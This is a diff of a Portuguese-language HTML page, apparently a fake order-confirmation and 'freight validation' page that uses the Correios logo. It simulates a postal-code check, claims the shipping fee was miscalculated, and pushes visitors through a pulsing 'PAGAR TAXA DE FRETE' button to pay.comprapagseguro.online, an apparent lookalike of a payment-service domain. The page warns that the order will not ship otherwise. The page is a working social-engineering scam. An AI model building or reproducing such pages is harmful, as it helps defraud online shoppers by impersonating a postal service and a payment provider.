@@ -1,16 +1,13 @@
-
-<!DOCTYPE html>
-<html lang="pt-BR">
-    <head>
-        <meta charset="UTF-8"/>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<html lang="pt-BR"><script id="allow-copy_script" src="chrome-extension://aefehdhdciieocakfobpaaolhipkcpgc/content_scripts/copy.js"></script><head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Pedido Concluído - Validação de Frete</title>
-        <meta name="description" content="Página de confirmação de pedido e validação de frete"/>
-        <meta property="og:title" content="Pedido Concluído - Validação de Frete"/>
-        <meta property="og:description" content="Confirme seu pedido e valide o frete para entrega"/>
-        <meta property="og:type" content="website"/>
+        <meta name="description" content="Página de confirmação de pedido e validação de frete">
+        <meta property="og:title" content="Pedido Concluído - Validação de Frete">
+        <meta property="og:description" content="Confirme seu pedido e valide o frete para entrega">
+        <meta property="og:type" content="website">
         <!-- Fonte Montserrat -->
-        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet"/>
+        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&amp;display=swap" rel="stylesheet">
         <style>
       /* ======================= VARIÁVEIS ======================= */
       :root {
@@ -276,11 +273,11 @@
       }
     </style>
     </head>
-    <body style="margin-top: -20px;">
+    <body style="margin-top: -20px;" cz-shortcut-listen="true">
         <div class="container" role="main" style="border-radius: 30px;">
             <!-- Cabeçalho -->
             <header class="header" aria-label="Cabeçalho do pedido concluído" style="display: flex; align-items: center; justify-content: space-between;">
-                <img src="https://i.ibb.co/tsj2KbC/Design-sem-nome-85.png" style="height: 60px; margin-right: 10px;">
+                <img src="https://i.ibb.co/yhSNZH6/Design-sem-nome-86.png" style="height: 60px; margin-right: 10px;">
                 <div style="padding-left: 1px;">
                     <h1 style="text-align: left; font-size: 20px; margin-bottom: 0;">Pedido Concluído&nbsp;✅</h1>
                     <p style="font-size: 15px;">Validação de Frete em Andamento</p>
@@ -292,36 +289,36 @@
                 <div class="progress-container">
                     <div class="progress-steps">
                         <div class="step active" aria-label="Etapa 1">1</div>
-                        <div class="step" aria-label="Etapa 2">2</div>
-                        <div class="step" aria-label="Etapa 3">3</div>
-                        <div class="step" aria-label="Etapa 4">4</div>
+                        <div class="step active" aria-label="Etapa 2">2</div>
+                        <div class="step active" aria-label="Etapa 3">3</div>
+                        <div class="step active" aria-label="Etapa 4">4</div>
                     </div>
                     <div class="progress-bar">
-                        <div class="progress" id="progressBar"></div>
+                        <div class="progress" id="progressBar" style="width: 100%;"></div>
                     </div>
                 </div>
                 <!-- Etapa 1 -->
                 <article id="step1" class="message active" aria-live="polite" style="border-radius: 15px; padding-top: 10px; padding-bottom: 10px; margin-bottom: 10px;">
                     <p style="font-weight: bold;">Estamos validando o CEP para entrega...</p>
-                    <div class="loader" aria-label="Carregando..."></div>
+                    <div class="loader hidden" aria-label="Carregando..."></div>
                     <p>Aguarde um momento...</p>
                 </article>
                 <!-- Etapa 2 -->
-                <article id="step2" class="message hidden" aria-live="polite" style="border-radius: 15px; padding-top: 10px; padding-bottom: 10px; margin-bottom: 10px;">
+                <article id="step2" class="message active" aria-live="polite" style="border-radius: 15px; padding-top: 10px; padding-bottom: 10px; margin-bottom: 10px;">
                     <p style="font-weight: bold;">Validação do CEP para Entrega</p>
                     <p>Consultando sistema dos Correios...</p>
                 </article>
                 <!-- Etapa 3 -->
-                <article id="step3" class="message hidden" aria-live="polite" style="border-top-left-radius: 15px;">
+                <article id="step3" class="message active" aria-live="polite" style="border-top-left-radius: 15px;">
                     <div class="warning" style="margin-bottom: 10px; margin-top: 0px;">
                         <!-- Altere para o caminho da sua imagem -->
-                        <img src="https://i.ibb.co/xS0vD5v/correioslogo.png" alt="Logo Correios" style="height: 30px;"/>
+                        <img src="https://i.ibb.co/xS0vD5v/correioslogo.png" alt="Logo Correios" style="height: 30px;">
                         <p style="margin: 0;">
               O valor do frete foi calculado incorretamente para sua região. </p>
                     </div>
                 </article>
                 <!-- Etapa 4 -->
-                <article id="step4" class="message hidden" style="border-radius: 15px; margin-bottom: 10px; margin-top: -10px; padding: 10px 20px;">
+                <article id="step4" class="message active" style="border-radius: 15px; margin-bottom: 10px; margin-top: -10px; padding: 10px 20px;">
                     <p style="font-weight: bold; margin-bottom: -10px;">
             Faça o pagamento do frete para que seu pedido seja enviado. </p><a href="https://pay.comprapagseguro.online/KV603kJm6lLgw8y" style="text-decoration: none;"> <button class="button" onclick="pagarFrete()" aria-label="Pagar taxa de frete" style="font-size: 15px; font-weight: 900; animation: pulse 2.5s infinite;"> PAGAR TAXA DE FRETE </button><style>
 @keyframes pulse {
@@ -336,9 +333,9 @@
   }
 }
 </style></a><small></small>
-                    Caso o pagamento não seja realizado, <br/>
+                    Caso o pagamento não seja realizado, <br>
                     o pedido não será enviado. 
-                </small>
+                
             </article>
         </section>
     </div>
@@ -404,4 +401,5 @@
         simulateSteps();
       });
     </script>
-</body>
+
+</body></html>
